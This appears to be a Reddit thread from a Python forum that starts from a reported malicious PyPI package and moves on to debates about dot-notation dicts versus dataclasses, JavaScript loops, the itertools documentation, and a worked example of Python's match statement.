+To OP: this was not an exploit anyone could have used nefarious purposes, this was someone having run / running an attack, through a PyPI package.  So your public reporting didn't enable anyone to do something bad, it only (potentially) helped people stop using this package.  Hmm it might even be better than just PyPI removing the package… since this, IIRC, doesn't even tell anyone who has it installed that it's bad now.
+I would say that there's no way they signed up for the endpoint with legit billing info, but the code makes me wonder.
+Dot notation isn't "optimized" for anything. Certainly not for reading. You're changing a default structure of the standard library. That's the **opposite** of good for reading. 
+
+> Your last paragraph doesn't make sense. Neither of us are even talking about using dictionaries at all for dot notation. So in either case you wouldn't be accessing a dict. Accessing an object with dot notation is not surprising either. It's expected.
+
+That's some fish memory, my friend. This whole conversation is about dictionaries. The whole reason SimpleNamespace was even brought up is because OP wants to access dictionaries using a dot notation.
+I‘d be very interested in a thorough comparison
+Well if you are a JS developer it’s hard to imagine a world where you actually write the code 🤣. For them writing a class that allows dot notation on dicts might seem like the job for a Google engineer 🤣
+Yes, I'll check their discord to discuss this. Would be absolutely awesome if we can add some of this on that scale and if it would be useful.
+I really [liked this article about itertools](https://realpython.com/python-itertools/). But to not play favorites, here is the [official documentation](https://docs.python.org/3/library/itertools.html) too.
+> I saved the world from a very dangerous hacker
+
+Look at this weirdo trying to take credit from our lord and master /u/__Enrico_Palazzo__
+VMs can and have been escaped.
+
+You are *probably* fine, but you're gambling.
+How to you know that? Are you the SPY accomplice?
+"Not many people are named after a plane crash."
+> You are right in your analysis. To OP: this was not an exploit anyone could have used nefarious purposes
+
+Wait until I publish a package that monkeypatches this package to use an endpoint of my own! /s
+
+I agree with you: OP did the right thing reporting it here in this situation
+This is really going over your head and I'm not going to argue with you. 
+
+When the commenter above said "Why not just use SimpleNamespace" and I said "No, use Dataclasses" we are both saying this: "If you want to access a dict with dot notation, you shouldn't even be using a dict, you should be using ____." And yet you are so sure that this is somehow changing a "default structure of the standard library". Which is.... Interesting? 
+
+Listen this conversation about dicts, NamedTuples, namespaces, and classes has been going on for decades across many languages. How to group data can be done in many ways. If you go through a Java or Python code base you're going to find classes with just attributes and no methods. Guaranteed. Python devs (good ones) will group data together like this as Dataclasses if they don't want to use a dict. Choosing to group similar data as a class instead of a dict is a choice some people make. 
+
+Here is a recent stack overflow post:
+https://stackoverflow.com/questions/52679693/classes-with-attributes-but-no-methods
+
+You can see some people like it and some people don't (it's INSANELY common though). 
+
+So why have Python devs in particular favored things like dataclasses over dicts? The biggest reason is that dicts are type poison to your code base. By this I mean they are unpredictable in Python. When functions and classes pass dicts around and access their values, the programmer and the program often don't know what type the values are before runtime. With a class (especially a dataclass or something like a Pydantic validator) it's easy to not only document the value types, but also assert them on creation and tell mypy what they ought to be when the program runs.  
+
+This problem is so common that the standard lib Typing recently introduced a TypedDict object:
+https://peps.python.org/pep-0589/
+
+Notice that TypedDict just looks like a dataclass? It's just a user-defined class that inherits from TypedDict. This is because classes and dicts are VERY similar in python. Classes are essentially thin wrappers on dicts. And it's extremely common to swap them out. I know several professional codebases that will NEVER use a single dict. Not one. They use only TypedDict or Dataclasses.
+
+And yes, many many many people find it cleaner to access the attributes of a class than keys of a dict.  So even if you aren't using classes or data classes to help with the type poison I've mentioned, and just choose to do it because you find it easier to document, read, and pass as arguments to functions, this is very common. 
+
+Some people like to do it and others don't. Neither myself nor the commenter above are saying you SHOULD. We are saying if you want to use a package such as the one mentioned by OP that just gives dot notation to dicts: "You shouldn't even be using a dict, you should be using ____."
+
+If you still don't get this I can't help you my friend. Have a wonderful Thursday.
+well as I've just discovered, apparently js needs an external library just to loop through an array.  And it got hijacked at one point.
+
+https://www.theregister.com/2022/05/10/security_npm_email/
+
+python: can loop through an array with a built-in function
+
+js: cannot do this.
+
+
+And there's a package to determine if a number is odd: https://www.npmjs.com/package/is-odd
+and a package to determine if a number is even https://www.npmjs.com/package/is-even, which has is-odd as a dependency.
+Hey leave them alone! They just got class declarations not too long ago ;-)
+Thanks for the real python link I did not know about that one. As for the official documentation, it is the source of my headaches. 
+
+The rest of the python doc is well written, understandable and gets you from simple to complex in an ordered way. But giving a rough equivalent of the code necessary to implement a function is NOT A GOOD WAY to explain that function.
+
+Note that PEP 636: Structural pattern matching is also badly written. The simplest use case for it is "matching a single value" and that use case is almost in the middle of the document with an example followed by that line (among others):
+
+> A pattern like ["get", obj] will match only 2-element sequences that have a first element equal to "get". It will also bind obj = subject[1]  
+
+Aaaah! That explains everything about matching a single value.
+
+Sorry ... Needed to vent.
+I known, I known, he'll get the young virgins throwing flowers, but I got plenty of help with itertools! (Ah, Ah, Ah, Ah) <== maniacal, evil laughter.
+Whats your solution then?
+That's it! Brad Pitt was behind this the whole time.
+>apparently js needs an external library just to loop through an array.
+
+**No**
+
+ES6 has `Array.forEach` and `for of` loops.
+
+Demo:
+
+    // Assume that array is initialised
+    array.forEach(el => { 
+        // Do something
+    })
+
+OR
+
+    for (const el of array) {
+        // Do something
+    }
+
+Anyone using third party libraries is just a shitty programmer who hasn't bothered to learn the language properly.
+Faie enough 🤣🤣🤣
+You are most welcome! In fact I had my issues with this too and can relate. Btw., I am sure Python [would benefit from issues that mention concrete shortcomings](https://github.com/python/cpython/issues), that is, if you are up to another good deed.
+
+I just linked to the official docs because [I noticed a tendency from third-party/freemium sites to creep in](https://www.reddit.com/r/Python/comments/uv0ehi/comment/i9jqu66/?utm_source=share&utm_medium=web2x&context=3).
+
+And while I am making that issue of mine more visible, we could also talk [about changes to pypi or who could catch stuff like this](https://www.reddit.com/r/Python/comments/uwhzkj/comment/i9se3lr/?utm_source=share&utm_medium=web2x&context=3) (disclaimer: it is also my own comment).
+Yo I just had a eureka moment on the match statement a couple days ago. I put together a couple gists to show my learnings. It is using xml.etree.ElementTree to parse some xml from a game. 
+
+Main thing to remember is it is not intended to be a simple case select, though it can be used that way. In this code I am making a lot of use of matching attributes of classes. My match statement is at the very bottom. Kind of my main loop so to speak for this example. 
+
+I have more robust examples I was working on last night but there is a dog on me, so I can't get them.
+
+Code: 
+https://gist.github.com/mriswithe/da332f18462c2cdd01d462b8c7472ddf
+
+
+Data: https://gist.github.com/mriswithe/930036c557b51c9729b7d40828f34943
+
+
+
+
+edit: Dog decided to move, I am now allowed to walk about the cabin
+
+
+Source of my example: https://github.com/akettmann/ftl_parsing/blob/master/ftl/models/blueprints.py#L151
+
+Code of the case select:
+
+    @classmethod
+    def from_elem(cls, e: Element) -> "ShipBlueprint":
+        kw: dict[str, Any] = e.attrib.copy()
+        kw["augments"] = augs = []
+        for sub in e:
+            match sub:
+                case Element(tag=ShipClass.tag_name):
+                    kw["class"] = ShipClass.from_elem(sub)
+                case Element(tag=SystemList.tag_name):
+                    kw["system_list"] = SystemList.from_elem(sub)
+                case Element(tag=WeaponList.tag_name):
+                    kw["weapon_list"] = WeaponList.from_elem(sub)
+                case Element(tag=CrewCount.tag_name):
+                    kw["crew_count"] = CrewCount.from_elem(sub)
+                case Element(tag=CloakImage.tag_name):
+                    kw["cloak_image"] = CloakImage.from_elem(sub)
+                case Element(tag=DroneList.tag_name):
+                    kw["drone_list"] = DroneList.from_elem(sub)
+                case Element(tag=Description.tag_name):
+                    kw["description"] = Description.from_elem(sub)
+                case Element(tag=Unlock.tag_name):
+                    kw["unlock"] = Unlock.from_elem(sub)
+                case Element(tag=ShieldImage.tag_name):
+                    kw["shield_image"] = ShieldImage.from_elem(sub)
+                case Element(tag=FloorImage.tag_name):
+                    kw["floor_image"] = FloorImage.from_elem(sub)
+                case Element(tag=Augment.tag_name):
+                    augs.append(Augment.from_elem(sub))
+                case Element(tag=tag, attrib={"amount": amt}) if tag in (
+                    "health",
+                    "maxPower",
+                ):
+                    kw[tag] = amt
+                case Element(tag=tag, text=t) if tag in (
+                    "boardingAI",
+                    "maxSector",
+                    "minSector",
+                ):
+                    kw[tag] = t
+                case Element(tag=tag, text=t) if tag in (
+                    "droneSlots",
+                    "weaponSlots",
+                    "name",
+                ):
+                    if tag == "name":
+                        tag = "display_name"
+                    kw[tag] = t
+                case _:
+                    raise Sad.from_sub_elem(e, sub)
+
+
+Alright lets break this down:
+
+            match sub:
+                case Element(tag=ShipClass.tag_name):
+                    kw["class"] = ShipClass.from_elem(sub)
+
+so in this context `sub` is always an XML Element (`xml.etree.ElementTree.Element`). This pattern is matching the case that:
+
+* sub is an instance of the Element class
+* sub.tag == ShipClass.tag_name
+
+So this behaves like something like this:
+
+    if isinstance(sub, Element) and sub.tag == ShipClass.tag_name:
+        kw["class"] = ShipClass.from_elem(sub)
+
+
+
+Next, something more advanced, some capturing of values
+
+                case Element(tag=tag, attrib={"amount": amt}) if tag in (
+                    "health",
+                    "maxPower",
+                ):
+                    kw[tag] = amt
+
+sub.attrib is a dictionary, this is relevant for this example
+This says:
+
+* sub is an Element
+* if the tag is one of the values in the list
+* `sub.tag` is assigned to the name `tag`
+* `sub.attrib` is a dictionary and has a key "amount"
+* `sub.attrib.amount` is assigned to amt
+
+
+next:
+
+                case Element(tag=tag, text=t) if tag in (
+                    "boardingAI",
+                    "maxSector",
+                    "minSector",
+                ):
+                    kw[tag] = t
+
+Pretty similar to the last one, but we are only checking that the tag is one of this list and capturing `sub.text` to `t`
+
+Last example:
+
+                case _:
+                    raise Sad.from_sub_elem(e, sub)
+
+This is your default/wildcard. it is not required. This doesn't capture anything. Useful for an `else` clause.
+>Note that PEP 636: Structural pattern matching is also badly written.
+
+Hey [I wrote something about that](https://github.com/Fawers/pattern-matching-in-python) some time ago. Please give me some feedback, if possible :)
+peps often aren't great to understand from unfortunately.
+PEPs are definitely not documentation. Not at all fair to try and judge them that way. edit: unless its title specifically says "tutorial" in which case fair play lol
+
+And as for itertools, well, writing the code seems to me the simplest and clearest way. What about that bothers you? (genuinely curious)
+[deleted]
+He did it for a caravan. Not for him, for his ma.
+Also .map and even an old fashioned for loop.
+Thanks for the links, sadly it is very difficult to report concrete shortcomings in documentation. It's almost impossible to report a problem when you don't understand what the module is supposed to do, and, you don't understand because the documentation has shortcomings. So it's a catch 22 situation.
+
+> I just linked to the official docs because...
+    
+And you're right, third-party/freemium sites do creep in. If the SEO  for the official python docs was better, there would be a lot more good python programmers! 
+
+> ...we could also talk about changes to pypi...
+
+The loss of pip search was a sad event. I discovered many, small, well written packages with it. Not enough people get involved and I can tell you why: It's difficult to 'get in'. If you click the small "contribute" link at the bottom of the pypi site you end up [here](https://github.com/pypa/warehouse). Not exactly a welcoming mat ! The python.org [get involved page](https://www.python.org/psf/get-involved/)  is a bit better, but right behind each of the links you get right into the action a bit too fast. As a retired CS guy I'd love to get involved and give some time, but I would need some handholding ( or more information) before I feel comfortable doing so.
+> is a dog on me
+
+You have a dog? Nice :) Any photo?
+Wow! 
+
+I'll need a bit'o time to process all that. Thanks.
+Oh! Wow! This is really good.
+
+Here's the link to the[ English version](https://github.com/Fawers/pattern-matching-in-python/tree/in-english) for those, like me, who cannot read Spanish!
+They are usually great and PEP 636 is called: "Structural Pattern Matching: Tutorial". So It's supposed to be a tutorial!
+"often"?
+
+&#x200B;
+
+I usually find them very illuminating. Not only do you get an explanation and examples usually, but the whole why and how and alternatives get explained.
+It's the "roughly equivalent to" that do nothing to help me understand how I can use the functions. For me, explaining code with code is not a way to instruct someone. Note that, in the python docs for itertools, the first function, "accumulate", is well documented with examples that cover most use cases. After that, all the other functions have 1 or 2 lines of description and the code it's roughly equivalent to.
+
+It is unique in the python docs. Nowhere else did I see this way of documenting. ( I admit I did not read the whole python docs!).
+
+If you look at the documentation for [list comprehension](https://docs.python.org/3/tutorial/datastructures.html#list-comprehensions), it would be easy to explain the concept with roughly equivalent code (they all can be turned in standard for loops). But instead they provide clear text documentation and a slew of exemples that cover most use cases (even corner ones). Now that's documentation.
+
+I'm sure the itertools package would be way more popular if it was documented clearly.
+
+I'll get through it eventually, but I'll have to write a lot of scratch code to "discover it" by myself.
+BIOS hacks are known to be possible.
+And you transfer it with a usb key?
+His what?
+But that's not direct like python. Map produces another array, while a for loop forces you to manually manage the index, which can be error prone.
+Have you tried their discussion options (see your link)?
+
+- `Github issue tracker`_ for reporting issues
+- IRC: on `Libera`_, channel ``#pypa`` for general packaging discussion
+  and user support, and ``#pypa-dev`` for
+  discussions about development of packaging tools
+- The `PyPA Discord`_ for live discussions
+- The Packaging category on `Discourse`_ for discussing
+  new ideas and community initiatives
+I can explain anything in the itertools documentation, if you like. :)
+https://imgur.com/a/GOPAuZL
+
+Was the one in the hat.
+No worries. I am actually really excited to advocate for the match statement, but I totally went through the same confusion and annoyance when I wanted a simple case select. It isn't that though. A friend of mine said it best I think:
+
+
+yeah it's not like a switch case.. it's pythonerized
+which is annoying when you expect it to just be a switch case
+but nice when you realize what it can do
+
+
+
+Anyway if you want more details, I am happy to share. The problem I think is that a lot of python docs are made to cater to newbies to coding. Whereas someone who has coding experience, especially with Java, C, C++, older staticly compiled languages first, gets frustrated like "YEAH DUDE I KNOW HOW TO TIE MY SHOES, GET TO THE POINT". 
+
+So a tldr version for veterans of other languages is probably a great idea, one where we can use terms like assignment and unpacking.
+[deleted]
+[deleted]
+Pikeys: "His ma!"
+Sorry, but that‘s incorrect. You can even see it above. You can create a new array with „map“, yes, but „[1,2,3].forEach(x => console.log(x))“ will not create a new one. Also, the „for of“ loop is a direct counterpart to python‘s „for in“. No index needed.
+As the other person has said if you don’t want a new array returned then you can use .forEach.
+Lovely dogs 🐶
+Well, strictly speaking, the boot eeprom is flashable on the Pi 4, and prior Pi models loaded it at boot time from `bootcode.bin`.
+Dude, USB-key based hacks are decades old and still used today....they're very low-hanging-fruit.
+Again, I am the person who wrote about forEach and for of above
+>other person
+
+That was also me
+Agreed, love them both quite a lot
+Hello you 👋
